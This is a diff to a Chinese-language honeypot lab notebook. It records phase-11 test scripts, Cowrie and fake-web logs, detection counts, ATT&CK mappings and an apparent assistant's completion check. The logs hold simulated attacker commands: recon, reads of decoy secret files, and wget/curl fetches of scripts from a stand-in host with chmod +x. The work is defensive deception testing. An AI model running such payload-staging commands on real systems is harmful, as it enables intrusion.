@@ -2932,9 +2932,447 @@ Next phase:
 Phase 12 - Safety hardening and future expansion.
 ```
 
+## 第十一階段完成檢查
+最後請執行並把輸出貼給我確認：
+```
+/opt/deception-lab/scripts/test_web_scenarios.sh
+/opt/deception-lab/scripts/check_phase11_results.sh
+grep -o '"rule_id": "[^"]*"' /opt/deception-lab/data/events/detections.jsonl | sort | uniq -c
+cat /opt/deception-lab/reports/report.json | jq '.summary'
+cat /opt/deception-lab/PHASE11_READY.md
+grep -E "login attempt|CMD:|wget|curl|chmod|secrets.txt|backup_config.ini" /opt/deception-lab/data/collected/cowrie-docker.log | tail -n 80
+```
+- 執行結果：
+```
+lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/test_web_scenarios.sh
+[+] Testing Web login failure...
+[+] Testing Web honeycredential...
+[+] Testing Web honeyfile downloads...
+[+] Testing Web scanner paths...
+[+] Web scenario tests completed.
 
+[+] Last auth events:
+{"timestamp": "2026-05-21T20:13:55.354969+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+{"timestamp": "2026-05-22T22:26:28.303686+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
+{"timestamp": "2026-05-22T22:26:28.316795+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
+{"timestamp": "2026-05-22T22:55:19.379690+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "admin", "password_sha256": "8ecd67dceb90a898b1f94bddf570ce1c23629cd328140d81f1e02e43d42eb44e", "password_length": 13, "honeycredential_used": false, "user_agent": "curl/8.14.1", "severity": "medium", "tags": ["web", "login"]}
+{"timestamp": "2026-05-22T22:55:19.392430+00:00", "source": "fake-web", "event_type": "web_login_attempt", "src_ip": "172.18.0.1", "username": "backup", "password_sha256": "a597108ff8384b3be204d08bce36fe3e86bffcc699fdac27604db48ae6f27f71", "password_length": 11, "honeycredential_used": true, "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "login", "honeycredential"]}
 
+[+] Last access events:
+{"timestamp": "2026-05-22T22:55:19.405192+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "secrets.txt", "path": "/download/secrets.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
+{"timestamp": "2026-05-22T22:55:19.418113+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/backup_config.ini", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
+{"timestamp": "2026-05-22T22:55:19.418365+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "backup_config.ini", "path": "/download/backup_config.ini", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
+{"timestamp": "2026-05-22T22:55:19.431189+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "GET", "path": "/download/database_passwords.txt", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": false, "tags": ["web", "request"]}
+{"timestamp": "2026-05-22T22:55:19.431413+00:00", "source": "fake-web", "event_type": "web_honeyfile_access", "src_ip": "172.18.0.1", "filename": "database_passwords.txt", "path": "/download/database_passwords.txt", "user_agent": "curl/8.14.1", "severity": "high", "tags": ["web", "honeyfile", "download"]}
+{"timestamp": "2026-05-22T22:55:19.444095+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/.env", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
+{"timestamp": "2026-05-22T22:55:19.456674+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/wp-admin", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
+{"timestamp": "2026-05-22T22:55:19.465784+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/phpmyadmin", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
+{"timestamp": "2026-05-22T22:55:19.474959+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/server-status", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
+{"timestamp": "2026-05-22T22:55:19.484024+00:00", "source": "fake-web", "event_type": "web_request", "src_ip": "172.18.0.1", "method": "HEAD", "path": "/actuator/env", "query_string": "", "user_agent": "curl/8.14.1", "is_scanner_probe": true, "tags": ["web", "request", "scanner-probe"]}
+lss@lss:/opt/deception-lab $ /opt/deception-lab/scripts/check_phase11_results.sh
+=== Refreshing final report ===
+/opt/deception-lab/parser/generate_timeline.py:93: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  lines.append(f"Generated at: {datetime.utcnow().isoformat()}Z")
 
+=== Report Summary ===
+{
+  "detections_by_rule": {
+    "SSH_HONEYCREDENTIAL_LOGIN": 4,
+    "SSH_HONEYFILE_ACCESS": 11,
+    "SSH_LOGIN_FAILED": 1,
+    "SSH_RECON_COMMAND": 17,
+    "SSH_TOOL_TRANSFER_COMMAND": 7,
+    "WEB_HONEYCREDENTIAL_USED": 5,
+    "WEB_HONEYFILE_ACCESS": 11,
+    "WEB_SCANNER_PROBE": 15
+  },
+  "detections_by_severity": {
+    "high": 38,
+    "medium": 33
+  },
+  "events_by_source": {
+    "cowrie": 58,
+    "fake-web": 68
+  },
+  "events_by_type": {
+    "ssh_command": 44,
+    "ssh_connection": 5,
+    "ssh_login_failed": 1,
+    "ssh_login_success": 4,
+    "ssh_logout": 4,
+    "web_honeyfile_access": 11,
+    "web_login_attempt": 10,
+    "web_request": 47
+  },
+  "honeycredential_detections": 9,
+  "honeyfile_detections": 22,
+  "total_detections": 71,
+  "total_events": 126
+}
 
+=== Detection Rule Counts ===
+      4 "rule_id": "SSH_HONEYCREDENTIAL_LOGIN"
+     11 "rule_id": "SSH_HONEYFILE_ACCESS"
+      1 "rule_id": "SSH_LOGIN_FAILED"
+     17 "rule_id": "SSH_RECON_COMMAND"
+      7 "rule_id": "SSH_TOOL_TRANSFER_COMMAND"
+      5 "rule_id": "WEB_HONEYCREDENTIAL_USED"
+     11 "rule_id": "WEB_HONEYFILE_ACCESS"
+     15 "rule_id": "WEB_SCANNER_PROBE"
 
+=== ATT&CK Coverage ===
+{
+  "Collection": 22,
+  "Command and Control": 7,
+  "Credential Access": 10,
+  "Discovery": 17,
+  "Reconnaissance": 15
+}
+{
+  "T1005 Data from Local System": 22,
+  "T1082 System Information Discovery": 17,
+  "T1105 Ingress Tool Transfer": 7,
+  "T1110 Brute Force": 1,
+  "T1552 Unsecured Credentials": 9,
+  "T1595 Active Scanning": 15
+}
+
+=== Engage Coverage ===
+{
+  "Affect": 7,
+  "Elicit": 20,
+  "Expose": 16,
+  "Understand": 28
+}
+{
+  "Affect: Adversary Direction": 7,
+  "Elicit: Credential Collection": 9,
+  "Elicit: Reveal Adversary Intent": 11,
+  "Expose: Expose Decoy Service": 16,
+  "Understand: Collect Adversary Behavior": 28
+}
+
+=== Latest Report Files ===
+total 72K
+drwxrwxr-x 2 lss lss 4.0K May 22 03:11 .
+drwxr-xr-x 8 lss lss 4.0K May 23 06:51 ..
+-rw-rw-r-- 1 lss lss 2.4K May 23 06:55 mapping_report.md
+-rw-rw-r-- 1 lss lss  13K May 23 06:55 report.json
+-rw-rw-r-- 1 lss lss 5.9K May 23 06:55 report.md
+-rw-rw-r-- 1 lss lss  36K May 23 06:55 timeline.md
+lss@lss:/opt/deception-lab $ grep -o '"rule_id": "[^"]*"' /opt/deception-lab/data/events/detections.jsonl | sort | uniq -c
+      4 "rule_id": "SSH_HONEYCREDENTIAL_LOGIN"
+     11 "rule_id": "SSH_HONEYFILE_ACCESS"
+      1 "rule_id": "SSH_LOGIN_FAILED"
+     17 "rule_id": "SSH_RECON_COMMAND"
+      7 "rule_id": "SSH_TOOL_TRANSFER_COMMAND"
+      5 "rule_id": "WEB_HONEYCREDENTIAL_USED"
+     11 "rule_id": "WEB_HONEYFILE_ACCESS"
+     15 "rule_id": "WEB_SCANNER_PROBE"
+lss@lss:/opt/deception-lab $ cat /opt/deception-lab/reports/report.json | jq '.summary'
+{
+  "detections_by_rule": {
+    "SSH_HONEYCREDENTIAL_LOGIN": 4,
+    "SSH_HONEYFILE_ACCESS": 11,
+    "SSH_LOGIN_FAILED": 1,
+    "SSH_RECON_COMMAND": 17,
+    "SSH_TOOL_TRANSFER_COMMAND": 7,
+    "WEB_HONEYCREDENTIAL_USED": 5,
+    "WEB_HONEYFILE_ACCESS": 11,
+    "WEB_SCANNER_PROBE": 15
+  },
+  "detections_by_severity": {
+    "high": 38,
+    "medium": 33
+  },
+  "events_by_source": {
+    "cowrie": 58,
+    "fake-web": 68
+  },
+  "events_by_type": {
+    "ssh_command": 44,
+    "ssh_connection": 5,
+    "ssh_login_failed": 1,
+    "ssh_login_success": 4,
+    "ssh_logout": 4,
+    "web_honeyfile_access": 11,
+    "web_login_attempt": 10,
+    "web_request": 47
+  },
+  "honeycredential_detections": 9,
+  "honeyfile_detections": 22,
+  "total_detections": 71,
+  "total_events": 126
+}
+lss@lss:/opt/deception-lab $ cat /opt/deception-lab/PHASE11_READY.md
+# Phase 11 Ready
+
+Controlled attack scenario testing has been completed.
+
+Completed test scenarios:
+
+- SSH failed login test
+- SSH honeycredential login test
+- SSH reconnaissance command test
+- SSH honeyfile access test
+- SSH tool transfer command test
+- Web failed login test
+- Web honeycredential use test
+- Web honeyfile download test
+- Web scanner path probe test
+- Log collection refreshed
+- Parser rerun
+- MITRE mapping rerun
+- Final reports regenerated
+
+Main scripts:
+
+- /opt/deception-lab/scripts/test_web_scenarios.sh
+- /opt/deception-lab/scripts/check_phase11_results.sh
+
+Main report outputs:
+
+- /opt/deception-lab/reports/report.md
+- /opt/deception-lab/reports/report.json
+- /opt/deception-lab/reports/timeline.md
+
+Next phase:
+
+Phase 12 - Safety hardening and future expansion.
+lss@lss:/opt/deception-lab $ grep -E "login attempt|CMD:|wget|curl|chmod|secrets.txt|backup_config.ini" /opt/deception-lab/data/collected/cowrie-docker.log | tail -n 80
+deception-cowrie  | 2026-05-13T02:26:42+0800 [HoneyPotSSHTransport,0,172.18.0.1] login attempt [b'backup'/b'Backup2026!'] succeeded
+deception-cowrie  | 2026-05-13T02:27:07+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: whoami
+deception-cowrie  | 2026-05-13T02:27:11+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: pwd
+deception-cowrie  | 2026-05-13T02:27:14+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: is
+deception-cowrie  | 2026-05-13T02:27:16+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: ls
+deception-cowrie  | 2026-05-13T02:27:30+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: ls /home/admin
+deception-cowrie  | 2026-05-13T02:27:46+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: ls /home/admin
+deception-cowrie  | 2026-05-13T02:27:53+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: cat /home/admin/secrets.txt
+deception-cowrie  | 2026-05-13T02:27:53+0800 [HoneyPotSSHTransport,0,172.18.0.1] Command found: cat /home/admin/secrets.txt
+deception-cowrie  | 2026-05-13T02:27:57+0800 [HoneyPotSSHTransport,0,172.18.0.1] CMD: exit
+deception-cowrie  | 2026-05-22T03:52:13+0800 [HoneyPotSSHTransport,0,172.18.0.1] login attempt [b'root'/b'123456'] failed
+deception-cowrie  | 2026-05-22T03:56:06+0800 [HoneyPotSSHTransport,1,172.18.0.1] login attempt [b'backup'/b'Backup2026!'] succeeded
+deception-cowrie  | 2026-05-22T03:58:03+0800 [HoneyPotSSHTransport,1,172.18.0.1] CMD: whoami
+deception-cowrie  | 2026-05-22T03:58:03+0800 [HoneyPotSSHTransport,1,172.18.0.1] CMD: id
+deception-cowrie  | 2026-05-22T03:58:03+0800 [HoneyPotSSHTransport,1,172.18.0.1] CMD: pwd
+deception-cowrie  | 2026-05-22T03:58:03+0800 [HoneyPotSSHTransport,1,172.18.0.1] CMD: ls
+deception-cowrie  | 2026-05-22T03:58:03+0800 [HoneyPotSSHTransport,1,172.18.0.1] CMD: uname -a
+deception-cowrie  | 2026-05-22T03:58:08+0800 [HoneyPotSSHTransport,1,172.18.0.1] CMD: ps aux
+deception-cowrie  | 2026-05-22T04:04:37+0800 [HoneyPotSSHTransport,2,172.18.0.1] login attempt [b'backup'/b'Backup2026!'] succeeded
+deception-cowrie  | 2026-05-22T04:04:50+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: wget http://192.0.2.123/a.sh
+deception-cowrie  | 2026-05-22T04:04:50+0800 [HoneyPotSSHTransport,2,172.18.0.1] Command found: wget http://192.0.2.123/a.sh
+deception-cowrie  | 2026-05-22T04:05:02+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD:
+deception-cowrie  | 2026-05-22T04:05:26+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: cat /home/admin/secrets.txt
+deception-cowrie  | 2026-05-22T04:05:26+0800 [HoneyPotSSHTransport,2,172.18.0.1] Command found: cat /home/admin/secrets.txt
+deception-cowrie  | 2026-05-22T04:05:33+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: cat /home/admin/backup_config.ini
+deception-cowrie  | 2026-05-22T04:05:33+0800 [HoneyPotSSHTransport,2,172.18.0.1] Command found: cat /home/admin/backup_config.ini
+deception-cowrie  | 2026-05-22T04:05:39+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: cat /home/admin/database_passwords.txt
+deception-cowrie  | 2026-05-22T04:05:45+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: cat /home/backup/backup_jobs.txt
+deception-cowrie  | 2026-05-22T04:05:51+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: cat /etc/edge-gateway/app.conf
+deception-cowrie  | 2026-05-22T04:06:29+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: clear
+deception-cowrie  | 2026-05-22T04:06:35+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: wget http://192.0.2.123/a.sh
+deception-cowrie  | 2026-05-22T04:06:35+0800 [HoneyPotSSHTransport,2,172.18.0.1] Command found: wget http://192.0.2.123/a.sh
+deception-cowrie  | 2026-05-22T04:06:50+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD:
+deception-cowrie  | 2026-05-22T04:06:54+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+deception-cowrie  | 2026-05-22T04:06:54+0800 [HoneyPotSSHTransport,2,172.18.0.1] Command found: curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+deception-cowrie  | 2026-05-22T04:07:15+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: chmod +x /tmp/payload.sh
+deception-cowrie  | 2026-05-22T04:07:15+0800 [HoneyPotSSHTransport,2,172.18.0.1] Command found: chmod +x /tmp/payload.sh
+deception-cowrie  | 2026-05-22T04:08:48+0800 [HoneyPotSSHTransport,2,172.18.0.1] CMD: exit
+deception-cowrie  | 2026-05-23T06:36:43+0800 [HoneyPotSSHTransport,3,172.18.0.1] login attempt [b'backup'/b'Backup2026!'] succeeded
+deception-cowrie  |       File "/cowrie/cowrie-git/src/cowrie/commands/wget.py", line 605, in error
+deception-cowrie  | 2026-05-23T06:38:21+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: whoami
+deception-cowrie  | 2026-05-23T06:38:27+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: id
+deception-cowrie  | 2026-05-23T06:38:31+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: pwd
+deception-cowrie  | 2026-05-23T06:38:37+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: ls
+deception-cowrie  | 2026-05-23T06:38:45+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: uname -a
+deception-cowrie  | 2026-05-23T06:38:50+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: ps aux
+deception-cowrie  | 2026-05-23T06:38:59+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: cat /home/admin/secrets.txt
+deception-cowrie  | 2026-05-23T06:38:59+0800 [HoneyPotSSHTransport,3,172.18.0.1] Command found: cat /home/admin/secrets.txt
+deception-cowrie  | 2026-05-23T06:39:11+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: cat /home/admin/backup_config.ini
+deception-cowrie  | 2026-05-23T06:39:11+0800 [HoneyPotSSHTransport,3,172.18.0.1] Command found: cat /home/admin/backup_config.ini
+deception-cowrie  | 2026-05-23T06:39:17+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: cat /home/admin/database_passwords.txt
+deception-cowrie  | 2026-05-23T06:39:22+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: cat /home/backup/backup_jobs.txt
+deception-cowrie  | 2026-05-23T06:39:35+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: cat /etc/edge-gateway/app.conf
+deception-cowrie  | 2026-05-23T06:39:40+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: wget http://192.0.2.123/a.sh
+deception-cowrie  | 2026-05-23T06:39:40+0800 [HoneyPotSSHTransport,3,172.18.0.1] Command found: wget http://192.0.2.123/a.sh
+deception-cowrie  | 2026-05-23T06:39:57+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+deception-cowrie  | 2026-05-23T06:39:57+0800 [HoneyPotSSHTransport,3,172.18.0.1] Command found: curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+deception-cowrie  | 2026-05-23T06:40:11+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD:
+deception-cowrie  | 2026-05-23T06:40:11+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: HTTP request sent, awaiting response... ^C
+deception-cowrie  | 2026-05-23T06:40:20+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: chmod +x /tmp/payload.sh
+deception-cowrie  | 2026-05-23T06:40:20+0800 [HoneyPotSSHTransport,3,172.18.0.1] Command found: chmod +x /tmp/payload.sh
+deception-cowrie  | 2026-05-23T06:40:26+0800 [HoneyPotSSHTransport,3,172.18.0.1] CMD: exit
+
+# 確認：第十一階段完成檢查已通過，第十一階段可以判定完成。
+你這次的輸出已經完整涵蓋 Web 測試、SSH 測試、重新產生報告、MITRE mapping 結果與完成紀錄。重點如下。
+
+-----------------------------------------------------------------------
+1. Web 攻擊情境測試成功
+test_web_scenarios.sh 已成功執行：
+[+] Testing Web login failure...
+[+] Testing Web honeycredential...
+[+] Testing Web honeyfile downloads...
+[+] Testing Web scanner paths...
+[+] Web scenario tests completed.
+
+而且 Web auth log 有成功記錄：
+
+admin / wrongpassword
+honeycredential_used: false
+severity: medium
+
+以及：
+
+backup / Backup2026!
+honeycredential_used: true
+severity: high
+tags: web, login, honeycredential
+
+Web access log 也成功記錄 honeyfile 下載與 scanner probe，例如：
+web_honeyfile_access: secrets.txt
+web_honeyfile_access: backup_config.ini
+web_honeyfile_access: database_passwords.txt
+is_scanner_probe: true
+/.env
+/wp-admin
+/phpmyadmin
+/server-status
+/actuator/env
+
+這代表 Web failed login、Web honeycredential、Web honeyfile、Web scanner path 全部測試成功。
+
+-----------------------------------------------------------------------
+2. SSH 攻擊情境測試成功
+
+你的 Cowrie log 已成功記錄：
+
+login attempt [b'root'/b'123456'] failed
+login attempt [b'backup'/b'Backup2026!'] succeeded
+
+也成功記錄偵察指令：
+
+whoami
+id
+pwd
+ls
+uname -a
+ps aux
+
+honeyfile 存取：
+
+cat /home/admin/secrets.txt
+cat /home/admin/backup_config.ini
+cat /home/admin/database_passwords.txt
+cat /home/backup/backup_jobs.txt
+cat /etc/edge-gateway/app.conf
+
+工具下載或 payload staging 行為：
+wget http://192.0.2.123/a.sh
+curl http://192.0.2.123/payload.sh -o /tmp/payload.sh
+chmod +x /tmp/payload.sh
+
+這代表 SSH failed login、SSH honeycredential login、SSH recon command、SSH honeyfile access、SSH tool transfer command 都已成功產生 log。
+
+-----------------------------------------------------------------------
+3. Parser / Detection / Mapping / Report 重新產生成功
+
+check_phase11_results.sh 已成功刷新最終報告，並顯示目前結果：
+
+total_events: 126
+total_detections: 71
+honeycredential_detections: 9
+honeyfile_detections: 22
+
+目前 detection rule 命中數如下：
+
+4   SSH_HONEYCREDENTIAL_LOGIN
+11  SSH_HONEYFILE_ACCESS
+1   SSH_LOGIN_FAILED
+17  SSH_RECON_COMMAND
+7   SSH_TOOL_TRANSFER_COMMAND
+5   WEB_HONEYCREDENTIAL_USED
+11  WEB_HONEYFILE_ACCESS
+15  WEB_SCANNER_PROBE
+
+這很完整，因為第十一階段希望新增的 SSH_TOOL_TRANSFER_COMMAND 與 WEB_SCANNER_PROBE 都已經成功出現。
+
+-----------------------------------------------------------------------
+4. MITRE ATT&CK / Engage Coverage 正常
+
+ATT&CK coverage 已涵蓋：
+
+Collection: 22
+Command and Control: 7
+Credential Access: 10
+Discovery: 17
+Reconnaissance: 15
+
+技術包含：
+
+T1005 Data from Local System
+T1082 System Information Discovery
+T1105 Ingress Tool Transfer
+T1110 Brute Force
+T1552 Unsecured Credentials
+T1595 Active Scanning
+
+Engage coverage 已涵蓋：
+
+Affect: 7
+Elicit: 20
+Expose: 16
+Understand: 28
+
+這代表第十一階段產生的新情境已經正確進入 ATT&CK 與 Engage 對應結果
+
+-----------------------------------------------------------------------
+5. PHASE11_READY.md 已建立
+
+你的輸出已顯示：
+
+# Phase 11 Ready
+
+而且內容包含：
+
+SSH failed login test
+SSH honeycredential login test
+SSH reconnaissance command test
+SSH honeyfile access test
+SSH tool transfer command test
+Web failed login test
+Web honeycredential use test
+Web honeyfile download test
+Web scanner path probe test
+Log collection refreshed
+Parser rerun
+MITRE mapping rerun
+Final reports regenerated
+
+所以第十一階段完成紀錄也已成功建立。
+```
+
+## 第十一階段完成判定
+```
+[完成] Step 11.1  服務狀態確認
+[完成] Step 11.2  測試前 baseline report
+[完成] Step 11.3  測試紀錄資料夾
+[完成] Step 11.4  SSH 登入失敗測試
+[完成] Step 11.5  SSH honeycredential 登入
+[完成] Step 11.6  SSH 偵察指令
+[完成] Step 11.7  SSH honeyfile 存取
+[完成] Step 11.8  SSH 工具下載行為
+[完成] Step 11.9  Web 登入失敗
+[完成] Step 11.10 Web honeycredential
+[完成] Step 11.11 Web honeyfile 下載
+[完成] Step 11.12 Web scanner path
+[完成] Step 11.13 重新收集 log
+[完成] Step 11.14 重新執行 parser
+[完成] Step 11.15 detection rule 命中確認
+[完成] Step 11.16 MITRE mapping 重新執行
+[完成] Step 11.17 最終報告重新產生
+[完成] Step 11.18 Web 測試腳本
+[完成] Step 11.19 SSH 測試說明檔
+[完成] Step 11.20 測試後檢查腳本
+[完成] Step 11.21 PHASE11_READY.md
+```
 
